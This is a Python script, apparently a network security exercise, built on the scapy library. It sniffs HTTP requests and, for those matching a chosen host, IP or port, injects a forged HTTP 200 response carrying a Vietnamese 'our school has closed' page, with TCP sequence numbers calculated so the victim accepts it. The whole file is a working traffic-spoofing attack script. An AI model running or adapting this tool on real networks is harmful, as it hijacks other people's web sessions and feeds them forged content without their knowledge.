from scapy.all import *
import sys

load_layer("http")

def print_info():
	print('Usage: sudo python3 sniff.py <option> <parameter>')
	print('option:')
	print('-H, --host: Host in HTTP request to spoof')
	print('--dst : Destination IP to spoof')
	print('--dport: Destination port to spoof')
	print('Note: Only HTTP Request match all requirement is spoofed respond!')

class Config:
	def __init__(self):
		self.host = '';
		self.dst = '';
		self.dport = 0;

config = Config()
if (len(sys.argv) == 2 and sys.argv[1]=='--help'):
	print_info()
	quit()
else:
	for i in range(1, len(sys.argv)):
		if ( i % 2 == 0):
			continue
		if (sys.argv[i] == '--host' or sys.argv[i] =='-H'):
			if (i != len(sys.argv)-1):
				config.host = sys.argv[i+1]
		elif (sys.argv[i] == '--dport'):
			if (i != len(sys.argv)-1):
				config.dport = int(sys.argv[i+1])
		elif (sys.argv[i] == '--dst'):
			if (i != len(sys.argv)-1):
				config.dst = sys.argv[i+1]
		else:
			print_info()
			sys.exit('Invalid option %s' % sys.argv[i])

print("Host: %s" % config.host)
print("Dst IP: %s" %config.dst)
print("Dst port: %s" %config.dport)

def is_http_request(pkt):
	return pkt.haslayer(HTTPRequest)

def handle_http(pkt):
	match = True
	if (config.dport and pkt[TCP].dport != config.dport):
		match = False
		#print('dpost mismatch')
	if (config.dst and pkt[TCP].dst != config.dst):
		match = False
		#print('dst mismatch')
	if (config.host and pkt[HTTP].Host.decode("utf-8")  != config.host):
		match = False
		#print('host mismatch')
	else:
		print('Found 1 match: %s' % pkt[HTTP].Host)
	if (match):
		# swap src IP and dst IP
		ip = IP(src = pkt[IP].dst, dst = pkt[IP].src, chksum = 0)
		html_body = '<html><h1> truong chung toi da dong cua! </h1></html>'
		tcp_payload  = "HTTP/1.1 200 OK\r\n"
		tcp_payload += "Server: nginx\r\n"
		tcp_payload += "Content-Length: %d\r\n" % len(html_body)
		tcp_payload += "\r\n"
		tcp_payload += html_body
		# new sequence number
		new_seq = pkt[TCP].ack
		# new ack number 
		new_ack = pkt[TCP].seq + len(pkt[TCP].payload)
		#Swap src port, dstport and update sequence number
		tcp = TCP(sport = pkt[TCP].dport, dport = pkt[TCP].sport, seq = new_seq, ack=new_ack, flags='AP')
		spoof_packet = ip/tcp/tcp_payload
		# Re-calculate TCP checksum
		del(spoof_packet[TCP].chksum)
		# Re-calculate IP check sum
		del(spoof_packet[IP].chksum);
		#spoof_packet.show()
		send(spoof_packet)

pkt = sniff(lfilter=is_http_request, prn=handle_http) 
